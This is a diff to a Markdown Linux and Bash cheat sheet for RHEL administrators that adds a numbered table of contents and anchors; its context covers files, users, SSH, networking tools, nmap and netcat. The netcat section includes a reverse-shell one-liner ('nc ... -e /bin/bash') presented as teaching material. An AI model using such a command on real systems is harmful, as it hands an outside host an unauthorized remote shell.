@@ -1,10 +1,76 @@
-# Linux Bash Commands Cheat Sheet
+<a id="table-of-contents"></a>
+# 📚 Table of Contents
+
+- [1 Linux Bash Commands Cheat Sheet](#linux-bash-commands-cheat-sheet)
+  - [1.1 ℹ️ Get Command Help](#ℹ-get-command-help)
+  - [1.2 🌍 Navigating the System](#navigating-the-system)
+  - [1.3 📂 File and Directory Management](#file-and-directory-management)
+  - [1.4 🔗 File Links](#file-links)
+  - [1.5 ↔️ Input/Output Redirection](#inputoutput-redirection)
+  - [1.6 🔗 Piping Commands](#piping-commands)
+  - [1.7 ✏️ Text Search](#text-search)
+  - [1.8 ✍️ File Editors: `vi` / `vim`](#file-editors-vi--vim)
+  - [1.9 🤵 Users and Groups (Root Required)](#users-and-groups-root-required)
+  - [1.10 ⚡ Password Rules & Expiry](#password-rules--expiry)
+  - [1.11 🤷 Switching Users & Sudo](#switching-users--sudo)
+  - [1.12 📄 File Permissions](#file-permissions)
+  - [1.13 🚀 Processes & Jobs](#processes--jobs)
+  - [1.14 🔄 Services & Daemons](#services--daemons)
+  - [1.15 CONFIGURE AND SECURE SSH](#configure-and-secure-ssh)
+  - [1.16 📊 Disk and Memory](#disk-and-memory)
+  - [1.17 💾 Memory & Open Files](#memory--open-files)
+    - [1.17.1 Check Memory Usage](#check-memory-usage)
+    - [1.17.2 List Open Files with `lsof`](#list-open-files-with-lsof)
+  - [1.18 📁 Open Files & Ports](#open-files--ports)
+  - [1.19 🚨 Network Tools](#network-tools)
+  - [1.20 🚀 TCPDUMP (Sniffing)](#tcpdump-sniffing)
+  - [1.21 ⚙ Configure SSH](#configure-ssh)
+  - [1.22 🔐 SSH Keys (Passwordless Login)](#ssh-keys-passwordless-login)
+  - [1.23 📂 Log Files](#log-files)
+  - [1.24 ⚖️ Linux Network Configuration](#linux-network-configuration)
+    - [1.24.1 Specific to RH/CentOS distributions](#specific-to-rhcentos-distributions)
+    - [1.24.2 Folder location to know as an RH administrator](#folder-location-to-know-as-an-rh-administrator)
+- [2 To know files as a RH Admin](#to-know-files-as-a-rh-admin)
+    - [2.0.1 A great tool: nmcli](#a-great-tool-nmcli)
+  - [2.1 📃 System Files (RHEL)](#system-files-rhel)
+  - [2.2 ✅ Essential RHCSA Commands](#essential-rhcsa-commands)
+  - [2.3 ℹ️ Get Command Help](#ℹ-get-command-help)
+  - [2.4 🌍 Navigating the System](#navigating-the-system)
+  - [2.5 📂 File and Directory Management](#file-and-directory-management)
+  - [2.6 🔗 File Links](#file-links)
+  - [2.7 ↔️ Input/Output Redirection](#inputoutput-redirection)
+  - [2.8 🔗 Piping Commands](#piping-commands)
+  - [2.9 🔎 Regular Expressions & `grep`](#regular-expressions--grep)
+  - [2.10 🕒 Scheduling Tasks with `crontab`](#scheduling-tasks-with-crontab)
+  - [2.11 🧠 Concepts: Applications, Scripts, Processes, and More](#concepts-applications-scripts-processes-and-more)
+  - [2.12 💾 Memory & Open Files](#memory--open-files)
+    - [2.12.1 Check Memory Usage](#check-memory-usage)
+    - [2.12.2 List Open Files with `lsof`](#list-open-files-with-lsof)
+  - [2.13 🌐 Networking Tools](#networking-tools)
+    - [2.13.1 🧭 Visual Map of Network Communication](#visual-map-of-network-communication)
+    - [2.13.2 Monitor Network Connections and Routing](#monitor-network-connections-and-routing)
+    - [2.13.3 Inspect Live Traffic](#inspect-live-traffic)
+    - [2.13.4 🔬 Analyze Captured Traffic with Wireshark](#analyze-captured-traffic-with-wireshark)
+  - [2.14 🔧 Network Diagnostics with `netcat` and `nmap`](#network-diagnostics-with-netcat-and-nmap)
+    - [2.14.1 `netcat` (nc) – The Swiss Army Knife of Networking](#netcat-nc--the-swiss-army-knife-of-networking)
+    - [2.14.2 Reverse Shell with `netcat`](#reverse-shell-with-netcat)
+    - [2.14.3 `nmap` – Network Scanner & Security Tool](#nmap--network-scanner--security-tool)
+    - [2.14.4 🧾 `nc` vs `ncat` Feature Comparison](#nc-vs-ncat-feature-comparison)
+  - [2.15 🧪 Miscellaneous Tools](#miscellaneous-tools)
+    - [2.15.1 Base 64](#base-64)
+    - [2.15.2 Configure pip with Nexus](#configure-pip-with-nexus)
+  - [2.16 🔁 PO to MO File Conversion](#po-to-mo-file-conversion)
+  - [2.17 🔐 Create a Self-Signed SSL Certificate](#create-a-self-signed-ssl-certificate)
+
+<a id="linux-bash-commands-cheat-sheet"></a>
+# 1 Linux Bash Commands Cheat Sheet [🔝](#table-of-contents)
 
 > A simplified, structured guide for essential Linux and Bash commands, with selectable code blocks.
 
 ---
 
-## ℹ️ Get Command Help
+<a id="ℹ-get-command-help"></a>
+## 1.1 ℹ️ Get Command Help [🔝](#table-of-contents)
 
 ```bash
 man command_name
@@ -14,7 +80,8 @@ command_name --help
 
 ---
 
-## 🌍 Navigating the System
+<a id="navigating-the-system"></a>
+## 1.2 🌍 Navigating the System [🔝](#table-of-contents)
 
 ```bash
 cd /          # Go to root directory
@@ -31,7 +98,8 @@ ls -la        # Include hidden files
 
 ---
 
-## 📂 File and Directory Management
+<a id="file-and-directory-management"></a>
+## 1.3 📂 File and Directory Management [🔝](#table-of-contents)
 
 ```bash
 touch file.txt                # Create file
@@ -49,7 +117,8 @@ cat file.txt                  # Display file content
 
 ---
 
-## 🔗 File Links
+<a id="file-links"></a>
+## 1.4 🔗 File Links [🔝](#table-of-contents)
 Each time you create a file, the OS assign a number to that file on a hard disk, called inode (pointer or number). Creating a soft link to a file (soft link --> file --> inode) soft link is like a shortcut in Windows
 
 ```bash
@@ -65,7 +134,8 @@ ls -li                        # List with inode numbers
 
 ---
 
-## ↔️ Input/Output Redirection
+<a id="inputoutput-redirection"></a>
+## 1.5 ↔️ Input/Output Redirection [🔝](#table-of-contents)
 
 - Input and Output redirects: stdin, stdout, sdterro whith file descriptor number 0,1,2  
 - By default, when running a command its output goes to the terminal. 
@@ -79,7 +149,8 @@ command < input.txt           # Redirect input
 
 ---
 
-## 🔗 Piping Commands
+<a id="piping-commands"></a>
+## 1.6 🔗 Piping Commands [🔝](#table-of-contents)
 
 ```bash
 ls -ltr | more                # Paginate output
@@ -88,7 +159,8 @@ ls -l | tail                  # Show last lines
 
 ---
 
-## ✏️ Text Search
+<a id="text-search"></a>
+## 1.7 ✏️ Text Search [🔝](#table-of-contents)
 
 ```bash
 grep "word" file.txt
@@ -97,7 +169,8 @@ grep -i "word" file.txt       # Case insensitive
 
 ---
 
-## ✍️ File Editors: `vi` / `vim`
+<a id="file-editors-vi--vim"></a>
+## 1.8 ✍️ File Editors: `vi` / `vim` [🔝](#table-of-contents)
 
 - `i` to insert text
 - `ESC` to return to command mode
@@ -109,7 +182,8 @@ grep -i "word" file.txt       # Case insensitive
 
 ---
 
-## 🤵 Users and Groups (Root Required)
+<a id="users-and-groups-root-required"></a>
+## 1.9 🤵 Users and Groups (Root Required) [🔝](#table-of-contents)
 
 Records of users are maintained in 3 different files: /etc/passwd, /etc/group, /etc/shadow
 
@@ -145,7 +219,8 @@ chown group_name:group_name file_name
 
 ---
 
-## ⚡ Password Rules & Expiry
+<a id="password-rules--expiry"></a>
+## 1.10 ⚡ Password Rules & Expiry [🔝](#table-of-contents)
 
 - rules of rotation for user's password
 - chage command used to change or view the password expiration settings for a user account
@@ -159,7 +234,8 @@ Config file: `/etc/login.defs`
 
 ---
 
-## 🤷 Switching Users & Sudo
+<a id="switching-users--sudo"></a>
+## 1.11 🤷 Switching Users & Sudo [🔝](#table-of-contents)
 
 ```bash
 su - username
@@ -169,7 +245,8 @@ visudo                         # Edit sudoers file
 
 ---
 
-## 📄 File Permissions
+<a id="file-permissions"></a>
+## 1.12 📄 File Permissions [🔝](#table-of-contents)
 
 ```bash
 chmod u+x file.txt               # Add execute to user
@@ -184,7 +261,8 @@ chgrp group file.txt
 
 ---
 
-## 🚀 Processes & Jobs
+<a id="processes--jobs"></a>
+## 1.13 🚀 Processes & Jobs [🔝](#table-of-contents)
 
 - **Application / Service**: A program you run on your machine, such as `NTP`, `NFS`, `Apache`, or `rsyslog`.
 
@@ -208,7 +286,8 @@ kill -9 PID                     # Force kill
 
 ---
 
-## 🔄 Services & Daemons
+<a id="services--daemons"></a>
+## 1.14 🔄 Services & Daemons [🔝](#table-of-contents)
 
 - Every time you install an application or a package or a service in your linux environment, then you could control that program running command systemctl.  
 
@@ -259,7 +338,8 @@ ps -ef | grep systemd           # Check systemd
 ```
 
 
-## CONFIGURE AND SECURE SSH
+<a id="configure-and-secure-ssh"></a>
+## 1.15 CONFIGURE AND SECURE SSH [🔝](#table-of-contents)
 
 Open SSH is a package/software usually pre-installed in Linux Distributions, runs on port 22. Its service daemon is sshd
 SSH itself is secure, communication through SSH is always encrypted. But needs a little configuration by an administrator to secure better
@@ -307,7 +387,8 @@ systemctl restart sshd
 
 ---
 
-## 📊 Disk and Memory
+<a id="disk-and-memory"></a>
+## 1.16 📊 Disk and Memory [🔝](#table-of-contents)
 
 ```bash
 df -h                            # Disk usage
@@ -321,9 +402,11 @@ top # dynamic real-time process monitor
 ```
 
 
-## 💾 Memory & Open Files
+<a id="memory--open-files"></a>
+## 1.17 💾 Memory & Open Files [🔝](#table-of-contents)
 
-### Check Memory Usage
+<a id="check-memory-usage"></a>
+### 1.17.1 Check Memory Usage [🔝](#table-of-contents)
 
 ```bash
 free                          # Displays system memory usage (RAM)
@@ -333,7 +416,8 @@ free                          # Displays system memory usage (RAM)
 
 ---
 
-### List Open Files with `lsof`
+<a id="list-open-files-with-lsof"></a>
+### 1.17.2 List Open Files with `lsof` [🔝](#table-of-contents)
 
 ```bash
 lsof                          # List all open files
@@ -349,7 +433,8 @@ lsof -t                       # Print only process IDs
 
 ---
 
-## 📁 Open Files & Ports
+<a id="open-files--ports"></a>
+## 1.18 📁 Open Files & Ports [🔝](#table-of-contents)
 
 ```bash
 lsof -i                          # Open network files
@@ -359,7 +444,8 @@ lsof -u <user>                   # Files by user
 
 ---
 
-## 🚨 Network Tools
+<a id="network-tools"></a>
+## 1.19 🚨 Network Tools [🔝](#table-of-contents)
 
 ```bash
 ifconfig                         # Interface info
@@ -373,7 +459,8 @@ dig google.com
 
 ---
 
-## 🚀 TCPDUMP (Sniffing)
+<a id="tcpdump-sniffing"></a>
+## 1.20 🚀 TCPDUMP (Sniffing) [🔝](#table-of-contents)
 
 ```bash
 tcpdump -i enp0s3                # Monitor interface
@@ -383,7 +470,8 @@ tcpdump -i eth0 > capture.pcap   # Save traffic to file
 
 ---
 
-## ⚙ Configure SSH
+<a id="configure-ssh"></a>
+## 1.21 ⚙ Configure SSH [🔝](#table-of-contents)
 
 Edit `/etc/ssh/sshd_config`, then:
 
@@ -409,7 +497,8 @@ Port 2222
 
 ---
 
-## 🔐 SSH Keys (Passwordless Login)
+<a id="ssh-keys-passwordless-login"></a>
+## 1.22 🔐 SSH Keys (Passwordless Login) [🔝](#table-of-contents)
 
 ```bash
 ssh-keygen                        # Generate key
@@ -419,7 +508,8 @@ ssh user@ip_address              # Login
 
 ---
 
-## 📂 Log Files
+<a id="log-files"></a>
+## 1.23 📂 Log Files [🔝](#table-of-contents)
 
 ```bash
 cd /var/log
@@ -430,7 +520,8 @@ Other logs: `secure`, `messages`, `dmesg`, `maillog`, etc.
 
 ---
 
-## ⚖️ Linux Network Configuration
+<a id="linux-network-configuration"></a>
+## 1.24 ⚖️ Linux Network Configuration [🔝](#table-of-contents)
 - DHCP = Dynamic Host Control Protocol
 - Static IP vs DHCP
 - Static IP does not change: meaning you reboot, reconfigure, shut down for a month your computer, does not change
@@ -452,7 +543,8 @@ netstat -rnv # allows to find your Gateway IP address
 nslookup www.google.com # allows you to find your DNS server address
 ```
 
-### Specific to RH/CentOS distributions
+<a id="specific-to-rhcentos-distributions"></a>
+### 1.24.1 Specific to RH/CentOS distributions [🔝](#table-of-contents)
 - NetworkManager is the default network management service on RHEL 8 & 9
 - to install on another distribution, command $sudo apt install network-manager
 
@@ -463,9 +555,11 @@ ps -ef | grep Network
 systemctl restart NetworkManager
 ```
 
-### Folder location to know as an RH administrator
+<a id="folder-location-to-know-as-an-rh-administrator"></a>
+### 1.24.2 Folder location to know as an RH administrator [🔝](#table-of-contents)
 
-# To know files as a RH Admin
+<a id="to-know-files-as-a-rh-admin"></a>
+# 2 To know files as a RH Admin [🔝](#table-of-contents)
 ```bash
 /etc/sysconfig/network-scripts # contain config file of enp0s3, you can add other with ifup command
 /etc/hosts # 
@@ -474,7 +568,8 @@ systemctl restart NetworkManager
 /etc/nsswitch.conf
 ```
 
-### A great tool: nmcli
+<a id="a-great-tool-nmcli"></a>
+### 2.0.1 A great tool: nmcli [🔝](#table-of-contents)
 ```bash
 nmcli                            # Network CLI
 nmcli device
@@ -492,7 +587,8 @@ nmcli connection up enp0s3
 
 ---
 
-## 📃 System Files (RHEL)
+<a id="system-files-rhel"></a>
+## 2.1 📃 System Files (RHEL) [🔝](#table-of-contents)
 
 - `/etc/hosts` → Static hostname lookups  
 - `/etc/hostname` → Current hostname  
@@ -501,7 +597,8 @@ nmcli connection up enp0s3
 
 ---
 
-## ✅ Essential RHCSA Commands
+<a id="essential-rhcsa-commands"></a>
+## 2.2 ✅ Essential RHCSA Commands [🔝](#table-of-contents)
 
 ```bash
 ping
@@ -520,7 +617,8 @@ tcpdump -i your_device_name (eg enp0s3)
 
 ---
 
-## ℹ️ Get Command Help
+<a id="ℹ-get-command-help"></a>
+## 2.3 ℹ️ Get Command Help [🔝](#table-of-contents)
 
 ```bash
 man command_name
@@ -530,7 +628,8 @@ command_name --help
 
 ---
 
-## 🌍 Navigating the System
+<a id="navigating-the-system"></a>
+## 2.4 🌍 Navigating the System [🔝](#table-of-contents)
 
 ```bash
 cd /          # Go to root directory
@@ -547,7 +646,8 @@ ls -la        # Include hidden files
 
 ---
 
-## 📂 File and Directory Management
+<a id="file-and-directory-management"></a>
+## 2.5 📂 File and Directory Management [🔝](#table-of-contents)
 
 ```bash
 touch file.txt                # Create file
@@ -565,7 +665,8 @@ cat file.txt                  # Display file content
 
 ---
 
-## 🔗 File Links
+<a id="file-links"></a>
+## 2.6 🔗 File Links [🔝](#table-of-contents)
 
 > **Soft vs Hard Links**: 
 > - A **soft link** (symbolic link) is like a shortcut; it points to the path of a file.
@@ -583,7 +684,8 @@ ls -li                        # List files with inode numbers
 
 ---
 
-## ↔️ Input/Output Redirection
+<a id="inputoutput-redirection"></a>
+## 2.7 ↔️ Input/Output Redirection [🔝](#table-of-contents)
 
 > **Redirection** allows you to control where input comes from (stdin) and where output goes (stdout or stderr). Useful for saving output or automating tasks.
 
@@ -595,7 +697,8 @@ command < input.txt           # Use a file as input for the command
 
 ---
 
-## 🔗 Piping Commands
+<a id="piping-commands"></a>
+## 2.8 🔗 Piping Commands [🔝](#table-of-contents)
 
 > **Pipes (`|`)** let you pass the output of one command directly as input to another — great for chaining commands and filtering output.
 
@@ -606,7 +709,8 @@ ls -l | tail                  # Show only the last lines of output
 
 ---
 
-## 🔎 Regular Expressions & `grep`
+<a id="regular-expressions--grep"></a>
+## 2.9 🔎 Regular Expressions & `grep` [🔝](#table-of-contents)
 
 > **Regular Expressions (Regex)** are powerful patterns used to search, match, and manipulate text. Combined with commands like `grep`, they allow you to extract or filter lines in files based on complex criteria.
 
@@ -653,7 +757,8 @@ egrep -i "cat|dog" file.txt    # Match 'cat' or 'dog' (OR condition)
 
 ---
 
-## 🕒 Scheduling Tasks with `crontab`
+<a id="scheduling-tasks-with-crontab"></a>
+## 2.10 🕒 Scheduling Tasks with `crontab` [🔝](#table-of-contents)
 
 ```bash
 crontab -e                   # Edit user cronjobs
@@ -692,7 +797,8 @@ cat /etc/crontab
 
 ---
 
-## 🧠 Concepts: Applications, Scripts, Processes, and More
+<a id="concepts-applications-scripts-processes-and-more"></a>
+## 2.11 🧠 Concepts: Applications, Scripts, Processes, and More [🔝](#table-of-contents)
 
 > This section breaks down essential system-level components in Linux: what applications and processes are, how scripts work, and how the OS manages background services, threads, and scheduled jobs.
 
@@ -716,11 +822,13 @@ cat /etc/crontab
 
 ---
 
-## 💾 Memory & Open Files
+<a id="memory--open-files"></a>
+## 2.12 💾 Memory & Open Files [🔝](#table-of-contents)
 
 > This section covers tools to monitor and debug memory usage and file or network resource consumption on your system.
 
-### Check Memory Usage
+<a id="check-memory-usage"></a>
+### 2.12.1 Check Memory Usage [🔝](#table-of-contents)
 
 ```bash
 free                          # Displays system memory usage (RAM)
@@ -739,7 +847,8 @@ vmstat 1                      # Show memory, swap, I/O and CPU usage (updates ev
 
 ---
 
-### List Open Files with `lsof`
+<a id="list-open-files-with-lsof"></a>
+### 2.12.2 List Open Files with `lsof` [🔝](#table-of-contents)
 
 ```bash
 lsof                          # List all open files
@@ -754,13 +863,15 @@ lsof -t                       # Print only process IDs
 
 ---
 
-## 🌐 Networking Tools
+<a id="networking-tools"></a>
+## 2.13 🌐 Networking Tools [🔝](#table-of-contents)
 
 > This section covers common Linux networking commands to inspect interfaces, test connectivity, trace routes, and monitor ports and sockets.
 
 ---
 
-### 🧭 Visual Map of Network Communication
+<a id="visual-map-of-network-communication"></a>
+### 2.13.1 🧭 Visual Map of Network Communication [🔝](#table-of-contents)
 
 ```text
 +------------+       ping/traceroute        +------------+
@@ -791,7 +902,8 @@ nslookup google.com         # Get DNS resolution info
 dig google.com              # Alternative DNS query tool (requires bind-utils)
 ```
 
-### Monitor Network Connections and Routing
+<a id="monitor-network-connections-and-routing"></a>
+### 2.13.2 Monitor Network Connections and Routing [🔝](#table-of-contents)
 
 ```bash
 netstat -tuln               # List all listening ports (TCP/UDP) with numbers
@@ -799,7 +911,8 @@ netstat -rn                 # Show routing table
 ss -tuln                    # Modern replacement for netstat
 ```
 
-### Inspect Live Traffic
+<a id="inspect-live-traffic"></a>
+### 2.13.3 Inspect Live Traffic [🔝](#table-of-contents)
 
 > `tcpdump` is a powerful command-line packet analyzer that captures and displays network packets in real-time. It’s ideal for debugging, monitoring, or analyzing network activity.
 
@@ -823,7 +936,8 @@ tcpdump -w file.pcap        # Save capture to file (for Wireshark analysis)
 
 ---
 
-### 🔬 Analyze Captured Traffic with Wireshark
+<a id="analyze-captured-traffic-with-wireshark"></a>
+### 2.13.4 🔬 Analyze Captured Traffic with Wireshark [🔝](#table-of-contents)
 
 > **Wireshark** is a GUI-based packet analysis tool that lets you deeply inspect protocol traffic, filter by port or IP, and visualize communication flows. Use it in combination with `tcpdump`:
 
@@ -839,9 +953,11 @@ wireshark capture.pcap                # Open in GUI (requires X11/GUI environmen
 
 ---
 
-## 🔧 Network Diagnostics with `netcat` and `nmap`
+<a id="network-diagnostics-with-netcat-and-nmap"></a>
+## 2.14 🔧 Network Diagnostics with `netcat` and `nmap` [🔝](#table-of-contents)
 
-### `netcat` (nc) – The Swiss Army Knife of Networking
+<a id="netcat-nc--the-swiss-army-knife-of-networking"></a>
+### 2.14.1 `netcat` (nc) – The Swiss Army Knife of Networking [🔝](#table-of-contents)
 
 `netcat` (or `nc`) can be used to test ports, transfer files, and even create basic chat or reverse shells.
 
@@ -862,7 +978,8 @@ nc 192.168.1.10 4444 < file.txt
 
 ---
 
-### Reverse Shell with `netcat`
+<a id="reverse-shell-with-netcat"></a>
+### 2.14.2 Reverse Shell with `netcat` [🔝](#table-of-contents)
 
 > 🧬 **Diagram: How a Reverse Shell Works**
 >
@@ -891,7 +1008,8 @@ nc 192.168.1.5 4444 -e /bin/bash
 
 ---
 
-### `nmap` – Network Scanner & Security Tool
+<a id="nmap--network-scanner--security-tool"></a>
+### 2.14.3 `nmap` – Network Scanner & Security Tool [🔝](#table-of-contents)
 
 > `nmap` is a powerful network scanning tool used to discover hosts and services on a network.
 
@@ -906,7 +1024,8 @@ nmap -sV -A 192.168.1.10         # Detect OS and running services
 
 ---
 
-### 🧾 `nc` vs `ncat` Feature Comparison
+<a id="nc-vs-ncat-feature-comparison"></a>
+### 2.14.4 🧾 `nc` vs `ncat` Feature Comparison [🔝](#table-of-contents)
 
 | Feature                 | `nc` (netcat)         | `ncat` (from Nmap)       |
 |------------------------|------------------------|---------------------------|
@@ -923,10 +1042,12 @@ nmap -sV -A 192.168.1.10         # Detect OS and running services
 
 ---
 
-## 🧪 Miscellaneous Tools
+<a id="miscellaneous-tools"></a>
+## 2.15 🧪 Miscellaneous Tools [🔝](#table-of-contents)
 
 
-### Base 64
+<a id="base-64"></a>
+### 2.15.1 Base 64 [🔝](#table-of-contents)
 
 ```bash
 echo "string" | base64;
@@ -934,7 +1055,8 @@ echo "string" | base64 --decode; echo
 ```
 
 
-### Configure pip with Nexus
+<a id="configure-pip-with-nexus"></a>
+### 2.15.2 Configure pip with Nexus [🔝](#table-of-contents)
 
 **pip.conf (Linux/macOS)**:
 
@@ -978,7 +1100,8 @@ setx NEXUS_PASSWORD your_password
 
 ---
 
-## 🔁 PO to MO File Conversion
+<a id="po-to-mo-file-conversion"></a>
+## 2.16 🔁 PO to MO File Conversion [🔝](#table-of-contents)
 
 ```bash
 msgfmt -o output.mo input.po
@@ -986,7 +1109,8 @@ msgfmt -o output.mo input.po
 
 ---
 
-## 🔐 Create a Self-Signed SSL Certificate
+<a id="create-a-self-signed-ssl-certificate"></a>
+## 2.17 🔐 Create a Self-Signed SSL Certificate [🔝](#table-of-contents)
 
 ```bash
 # Generate Private Key
@@ -1003,4 +1127,3 @@ openssl rsa -aes256 -in private-key.pem -out encrypted-private-key.pem
 ```
 
 > Self-signed certificates are good for testing. For production, use a trusted Certificate Authority (CA).
-
